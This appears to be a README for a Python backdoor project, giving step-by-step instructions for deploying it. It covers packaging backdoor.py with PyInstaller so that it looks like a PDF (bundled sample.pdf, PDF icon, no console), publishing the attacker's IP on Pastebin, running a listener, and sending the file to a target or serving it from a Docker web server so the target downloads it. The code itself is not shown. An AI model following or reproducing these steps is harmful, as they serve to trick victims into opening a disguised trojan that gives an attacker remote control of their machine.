# ⚠️ | This Backdoor dosen't bypass windows defender and other AV's

For educational Purpose only
Dosen't matter if target dosen't have pyhton installed

You should have these requirements :
1. Python installed with required packages 
2. Pyinstaller installed
3. Update ur current IP address in [Pastebin.com](https://pastebin.com)
4. Must have docker installed if using it

## Steps to use this backdoor :
1. clone this repo :
    ```zsh
   git clone https://github.com/Anonomous69/Backdoor
   ```
   cd to that directory
2. find your pyinstaller path and run :
    ```powershell
    C:\Users\username\Appdata\wherever\your\pyinstaller\is\there\pyintstaller.exe --add-data=sample.pdf:.  -—onefile -—noconsole --icon pdf.ico backdoor.py
    ```
   The created backdoor must be in your "dist" folder in that directory
   
3. Run Listener is your machine and send the backdoor to target
   ```zsh
   python listeenr.py
   ```
 when target clicks backdoor, you get the connection
## 🐳 | Docker :
for a proper web server (lacking in windows) to host the backdoor.exe file use docker ( I know using Python webserver is more simpler but I am using something different )
steps:
1. cd to Docker directory
then run :
   ```
   docker build -t Dcoker .
   ```
2. Run the container
    ```
    docker run Dcoker
    ```
and then make the target go to <your_IP>:8080 in broser to download the ready-made .exe
